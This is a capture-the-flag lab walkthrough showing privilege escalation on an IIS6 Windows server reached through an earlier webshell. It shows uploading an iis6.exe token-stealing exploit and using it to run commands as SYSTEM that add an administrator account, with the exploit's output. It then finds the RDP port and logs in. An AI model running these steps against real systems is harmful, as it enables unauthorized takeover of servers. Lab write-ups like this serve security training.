# Open Lab 6 Privilege Escalation

## 0x00 General Overview

As we already get webshell from [Open Lab 5](../../file_upload/labo5_webshell_upload). We still need the SYSTEM level.

Lab site from [zkaq.org][1]

## 0x01 Go Hack It

### Virtual Terminal

Try open virtual terminal by right click on the site link on **caidao**. Terminal pops up. But all the commands are denied.

![](./imgs/virtual_cmd.jpg)

### Upoload Tools

cmd.exe and iis6.exe

![](./imgs/upload_tools.jpg)

### cmd.exe

Right click on cmd.exe and open the termial. We can try some basic command but still cannot create users.

![](./imgs/cmd.jpg)

### iis6.exe

There is an EXP in iis6.exe so it can inject on SYSTEM process and get the corresponding TOKEN and process user input commands.

So we can create user now.

```cmd
> E:\05\Databases\iis6.exe "net user username password /add"
[IIS6Up]-->IIS Token PipeAdmin golds7n Version 
[IIS6Up]-->This exploit gives you a Local System shell 
[IIS6Up]-->Set registry OK
[process walking]: 1668 cmd.exe
[process walking]: 1672 wmiprvse.exe
[IIS6Up]-->Got WMI process Pid: 1672 
[Try 1 time...]
[IIS6Up]-->Found token NETWORK SERVICE 
[IIS6Up]-->Found token SYSTEM 
[*]Running command with SYSTEM Token...
[*]Command: net user username password /add
[+]Done, command should have ran as SYSTEM!
```

And also need add user to Administrator group.

```cmd
E:\05\> E:\05\Databases\iis6.exe "net localgroup administrators username /add"
[IIS6Up]-->IIS Token PipeAdmin golds7n Version 
[IIS6Up]-->This exploit gives you a Local System shell 
[IIS6Up]-->Set registry OK
[process walking]: 1672 wmiprvse.exe
[IIS6Up]-->Got WMI process Pid: 1672 
[Try 1 time...]
[IIS6Up]-->Found token NETWORK SERVICE 
[IIS6Up]-->Found token NETWORK SERVICE 
[IIS6Up]-->Found token SYSTEM 
[*]Running command with SYSTEM Token...
[*]Command: net localgroup administrators username /add
[+]Done, command should have ran as SYSTEM!
```

### Connect Via RDP

Check PID for **svchost.exe TermService**   

```cmd
E:\05\> tasklist -svc

映像名称                       PID 服务                                        
========================= ======== ============================================
System Idle Process              0 暂缺                                        
System                           4 暂缺                                        
smss.exe                       280 暂缺                                        
csrss.exe                      328 暂缺                                        
winlogon.exe                   352 暂缺                                        
services.exe                   400 Eventlog, PlugPlay                          
lsass.exe                      412 HTTPFilter, PolicyAgent, ProtectedStorage,  
                                   SamSs                                       
svchost.exe                    588 DcomLaunch                                  
svchost.exe                    656 RpcSs                                       
svchost.exe                    724 Dhcp, Dnscache                              
svchost.exe                    740 LmHosts, W32Time                            
svchost.exe                    780 AeLookupSvc, BITS, Browser, CryptSvc,       
                                   dmserver, EventSystem, helpsvc,             
                                   lanmanserver, lanmanworkstation, Netman,    
                                   Nla, Schedule, seclogon, SENS,              
                                   ShellHWDetection, TrkWks, winmgmt,          
                                   wuauserv, WZCSVC                            
explorer.exe                  1064 暂缺                                        
ctfmon.exe                    1160 暂缺                                        
oobechk.exe                   1176 暂缺                                        
mshta.exe                     1188 暂缺                                        
spoolsv.exe                   1308 Spooler                                     
msdtc.exe                     1332 MSDTC                                       
svchost.exe                   1420 ERSvc                                       
inetinfo.exe                  1496 IISADMIN                                    
svchost.exe                   1564 RemoteRegistry                              
svchost.exe                   1828 W3SVC                                       
w3wp.exe                      1984 暂缺                                        
svchost.exe                    300 TermService                                 
wmiprvse.exe                  1168 暂缺                                        
wuauclt.exe                   2096 暂缺                                        
logon.scr                     2840 暂缺                                        
csrss.exe                     2624 暂缺                                        
winlogon.exe                  2644 暂缺                                        
csrss.exe                     1708 暂缺                                        
winlogon.exe                  3104 暂缺                                        
cmd.exe                       3876 暂缺                                        
tasklist.exe                  3176 暂缺                                        
wmiprvse.exe                  2608 暂缺                 
```

And check RDP port. Normally by default is 3389.

```cmd
E:\05\> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:81             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       412
  TCP    0.0.0.0:1028           0.0.0.0:0              LISTENING       1332
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       300
  TCP    0.0.0.0:8881           0.0.0.0:0              LISTENING       4
  TCP    10.10.1.79:139         0.0.0.0:0              LISTENING       4
  TCP    10.10.1.79:8881        202.161.100.112:27275  ESTABLISHED     4
  TCP    169.254.20.122:135     169.254.20.122:1027    ESTABLISHED     656
  TCP    169.254.20.122:139     0.0.0.0:0              LISTENING       4
  TCP    169.254.20.122:1027    169.254.20.122:135     ESTABLISHED     1188
  UDP    0.0.0.0:445            *:*                                    4
  UDP    0.0.0.0:500            *:*                                    412
  UDP    0.0.0.0:1029           *:*                                    724
  UDP    0.0.0.0:4500           *:*                                    412
  UDP    10.10.1.79:123         *:*                                    740
  UDP    10.10.1.79:137         *:*                                    4
  UDP    10.10.1.79:138         *:*                                    4
  UDP    127.0.0.1:123          *:*                                    740
  UDP    169.254.20.122:123     *:*                                    740
  UDP    169.254.20.122:137     *:*                                    4
  UDP    169.254.20.122:138     *:*                                    4
```

So now we can try connect RDP with ip, port, username and corresponding password.

### FLAG

![](./imgs/flag.jpg)

FLAG = zkz{F3ck_power_3y3stem}

[1]: https://hack.zkaq.org/?a=battle&f=target&id=3eb7bec4a7e95297
